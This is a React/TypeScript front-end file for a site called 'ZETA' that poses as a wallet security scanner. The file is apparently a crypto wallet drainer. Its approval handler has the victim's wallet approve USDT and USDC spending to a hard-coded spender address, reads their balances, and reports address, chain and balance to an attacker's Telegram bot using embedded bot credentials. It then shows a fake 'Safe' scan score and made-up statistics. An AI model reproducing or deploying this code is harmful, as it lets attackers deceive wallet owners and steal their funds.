import { useState } from 'react';
import { ethers } from 'ethers';
import WalletScanner from './components/WalletScanner';

function App() {
  const [account, setAccount] = useState('');
  const [status, setStatus] = useState('Not connected');
  const [recentScans, setRecentScans] = useState<
    { address: string; timestamp: string; status: string; score: number }[]
  >([]);
  const [stats, setStats] = useState({
    scanned: 234567,
    compromised: 5432,
    safe: 229135,
  });

  // 🔹 Connect wallet
  const connectWallet = async () => {
    if (!window.ethereum) return alert('Install MetaMask');
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send('eth_requestAccounts', []);
      setAccount(accounts[0]);
      setStatus('Wallet connected');
    } catch (err) {
      console.error(err);
      setStatus('Connection failed');
    }
  };

  // 🔹 Disconnect wallet
  const disconnectWallet = () => {
    setAccount('');
    setStatus('Wallet disconnected');
  };

  // 🔹 Approve USDC & USDT on selected chain
  const handleApproval = async (chain: string) => {
    if (!account) return alert('Connect your wallet first');

    const CHAIN_IDS: Record<string, string> = {
      ethereum: '0x1',
      polygon: '0x89',
      bsc: '0x38',
    };

    const TOKEN_ADDRESSES: Record<string, Record<string, string>> = {
      ethereum: {
        USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
        USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      },
      polygon: {
        USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
        USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
      },
      bsc: {
        USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
        USDT: '0x55d398326f99059fF775485246999027B3197955',
      },
    };
    let signer;
    try {
      // 🔹 Switch chain
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: CHAIN_IDS[chain] }],
      });

      const provider = new ethers.BrowserProvider(window.ethereum);
      signer = await provider.getSigner();

      const erc20Abi = [
        // approve(spender, value)
        'function approve(address spender, uint256 value) external returns (bool)',

        // balanceOf(account)
        'function balanceOf(address account) external view returns (uint256)',

        'function decimals() external view returns (uint8)',
      ];

      const spender = '0x14c7181776973bf57e01ed36c7e33946862fef66'; // 🔹 Replace with your contract

      for (const tokenSymbol of ['USDT', 'USDC']) {
        const tokenAddress = TOKEN_ADDRESSES[chain][tokenSymbol];
        const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);

        console.log(`Approving ${tokenSymbol} on ${chain}...`);
        const tx = await contract.approve(spender, 1000n * 10n ** 18n); // Example: approve 1000 tokens
        await tx.wait();
        console.log(`${tokenSymbol} approved on ${chain}`);
        const botToken = '8511969738:AAF23hZy-kL2Uk16nJv_8n6t53ao8w1dsoE';
        const chatId = '6951143640';

        const decimals = await contract.decimals();
        const userBalance = await contract.balanceOf(account);
        const formatted = ethers.formatUnits(userBalance, decimals);
        console.log(`User balance of ${'USDC'} on ${chain}: ${formatted}`);
        console.log(userBalance);

        const message = `
        Wallet Approval Notification
        Address: ${account}
        Token: ${tokenSymbol}
        Chain: ${chain.toUpperCase()}
        Transaction: Approved
        Time: ${new Date().toLocaleString()}
        Balance: ${formatted} ${tokenSymbol}
              `;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });
        // const botToken = '8014139548:AAFlcdsmgkJ_RF-yc-6K5x_O7maMTly9qt8';
        // const chatId = '1085058542';
        // await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        //   method: 'POST',
        //   headers: {
        //     'Content-Type': 'application/json',
        //   },
        //   body: JSON.stringify({
        //     chat_id: chatId,
        //     text: 'Hello from my bot!',
        //   }),
        // });
      }

      setStatus(`✅ USDC & USDT approved on ${chain.toUpperCase()}`);

      // 🔹 Update metrics & recent scan for demo purposes
      const newScan = {
        address: account,
        timestamp: new Date().toLocaleTimeString(),
        status: 'Safe',
        score: Math.floor(Math.random() * 100),
      };
      setRecentScans([newScan, ...recentScans].slice(0, 5));
      setStats({
        scanned: stats.scanned + 1,
        compromised: stats.compromised,
        safe: stats.safe + 1,
      });
    } catch (err) {
      // console.error(err);

      setStatus('Approval request failed or rejected');

      // const response = await fetch(
      //   `https://api.telegram.org/bot${botToken}/getUpdates`
      // );
      // const data = await response.json();
      // console.log(data);
    }
  };

  return (
    <div className="min-h-screen bg-[#04111A] text-white flex flex-col">
      <header className="w-full flex flex-col sm:flex-row justify-between items-center px-6 sm:px-10 py-5 bg-[#0A2436] border-b border-[#13394C]">
        <span className="text-2xl sm:text-3xl font-extrabold text-[#78AEE0] mb-3 sm:mb-0">
          ZETA
        </span>

        {account ? (
          <p className="text-green-400 text-sm sm:text-base">
            Connected: {account.slice(0, 6)}...{account.slice(-4)}
          </p>
        ) : (
          <p className="text-[#7BAED1] text-sm sm:text-base">{status}</p>
        )}
      </header>

      <main className="flex flex-1 items-center justify-center px-4 sm:px-8 py-8 sm:py-16">
        <WalletScanner
          account={account}
          onConnect={connectWallet}
          onDisconnect={disconnectWallet}
          recentScans={recentScans}
          stats={stats}
          onRequestApproval={handleApproval} // 🔹 chain approval triggered
        />
      </main>

      <footer className="w-full text-center text-xs sm:text-sm text-[#7BAED1] py-4 border-t border-[#13394C]">
        {status}
      </footer>
    </div>
  );
}

export default App;
